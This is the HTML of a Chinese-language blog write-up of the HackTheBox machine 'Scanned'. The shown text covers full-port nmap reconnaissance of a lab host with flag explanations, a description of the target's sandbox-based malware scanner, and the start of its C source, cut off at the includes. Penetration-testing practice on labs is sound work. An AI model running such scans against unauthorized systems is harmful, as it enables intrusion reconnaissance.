@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+    
+    <meta name="author" content="kazma">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kazma.tw/2024/11/15/hackthebox-machines-scanned-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Scanned今天在神盾決賽前練習一些滲透測試，打算跟著官方 writeup 刷一些 insane 高分的機器。 Recon首先我們先做 nmap，但這邊官方提供了一些參數設定讓掃描速度提升： 12345678910111213141516171819202122┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]└──╼ [★]$ p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Machines Scanned Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/11/15/HackTheBox-Machines-Scanned-Writeup/index.html">
+<meta property="og:site_name" content="kazma&#39;s blog">
+<meta property="og:description" content="Scanned今天在神盾決賽前練習一些滲透測試，打算跟著官方 writeup 刷一些 insane 高分的機器。 Recon首先我們先做 nmap，但這邊官方提供了一些參數設定讓掃描速度提升： 12345678910111213141516171819202122┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]└──╼ [★]$ p">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kazma.tw/images/scanned_pwn.png">
+<meta property="article:published_time" content="2024-11-15T08:35:09.500Z">
+<meta property="article:modified_time" content="2024-11-15T12:37:28.869Z">
+<meta property="article:author" content="kazma">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="machines">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="pt">
+<meta property="article:tag" content="sandbox escape">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/scanned_pwn.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/kazma.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/kazma.png">
+    <meta name="theme-color" content="#94878e">
+    <link rel="shortcut icon" href="/images/kazma.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HackTheBox-Machines Scanned Writeup -
+        
+        kazma&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kazma.tw","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["成大資安社 創辦人/社長"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#94878e","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/smoke.png"},"title":"kazma.tw","subtitle":{"text":["Pwning my life: ","Tales of coding, cybersecurity, and campus life"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#FFFFFF"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/kazmatw","instagram":"https://www.instagram.com/kazma.tw/","zhihu":null,"twitter":null,"email":"kazmatw@gmail.com","telegram":"https://t.me/kazma_tw","discord":"https://discord.com/users/870280109360316457"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":"enable"},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#5d5764","right":"#94878e","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"ls":{"path":"/archives","icon":"fa-regular fa-archive"},"tags":{"icon":"fa-solid fa-tags","path":"/tags"},"whoami":{"path":"/whoami","icon":"fa-regular fa-user"},"cv":{"path":"/cv","icon":"fa-regular fa-file"},"ctfd":{"path":"https://class.nckuctf.org/","icon":"fa-brands fa-font-awesome"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/25 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "nq9qfhqgy4");
+    </script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-EH82J63NRM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-EH82J63NRM');
+</script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="kazma's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        kazma&#39;s blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/kazma.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                kazma&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    LS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/whoami"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    WHOAMI
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/cv"
+                                        >
+                                    <i class="fa-regular fa-file fa-fw"></i>
+                                    CV
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://class.nckuctf.org/"
+                                        >
+                                    <i class="fa-brands fa-font-awesome fa-fw"></i>
+                                    CTFD
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                LS
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/whoami"
+                        >
+                            <span>
+                                WHOAMI
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/cv"
+                        >
+                            <span>
+                                CV
+                            </span>
+                            
+                                <i class="fa-regular fa-file fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://class.nckuctf.org/"
+                        >
+                            <span>
+                                CTFD
+                            </span>
+                            
+                                <i class="fa-brands fa-font-awesome fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>Archives</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">63</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">109</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HackTheBox-Machines Scanned Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-15 16:35:09</span>
+        <span class="mobile">2024-11-15 16:35:09</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-15 20:37:28</span>
+            <span class="mobile">2024-11-15 20:37:28</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/htb/">htb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/machines/">machines</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pt/">pt</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sandbox-escape/">sandbox escape</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Scanned"><a href="#Scanned" class="headerlink" title="Scanned"></a>Scanned</h2><p>今天在神盾決賽前練習一些滲透測試，打算跟著官方 writeup 刷一些 insane 高分的機器。</p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先我們先做 nmap，但這邊官方提供了一些參數設定讓掃描速度提升：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]</span><br><span class="line">└──╼ [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.237.62 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line">┌─[sg-dedivip-1]─[10.10.14.22]─[kazma@htb-5fjpirbhiq]─[~]</span><br><span class="line">└──╼ [★]$ nmap -p<span class="variable">$ports</span> -sC -sV 10.129.237.62</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 02:56 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.237.62</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)</span><br><span class="line">|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)</span><br><span class="line">|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-title: Malware Scanner</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.77 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>-p-: 掃描所有 65535 個 TCP 端口。</li>
+<li>–min-rate&#x3D;1000: 確保掃描速率至少為 1000 個包&#x2F;秒，加快掃描。</li>
+<li>-T4: 使用更積極的時間參數，降低掃描延遲，但仍保持穩定性。<br>第一部分是盡快速的全端口掃描然後格式化輸出為正確的 ports 參數格式例如：22,80,443，然後把結果賦值給變數 ports。<br>然後第二個指令再針對開放的端口進行以下檢查：</li>
+<li>-sC: 使用 nmap 的內建腳本執行基本檢查（如默認憑證、常見漏洞、目標系統資訊）。</li>
+<li>-sV: 探測服務的版本信息，方便確認具體軟件及其潛在漏洞。</li>
+</ul>
+<p>然後從掃描結果我們可以看到他有個網頁服務叫做 Malware Scanner，透過瀏覽器訪問我們可以看到首頁有他的服務使用說明，我們可以透過上傳我們不信任的執行檔上去，他會幫我們在一個安全的環境測試，他會幫我們列出他使用到的 syscalls 和 arguments，然後根據危險程度排列，另外我們還可以得知他是用 Debian 11 去執行的，其中有使用到 chroot, user namespaces, ptrace 等工具做檢測，最後他有附上他這個 scanner 的 source code。<br>解壓縮之後我們可以拿到兩個資料夾，malscanner 跟 sandbox，街著就來做 code review：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 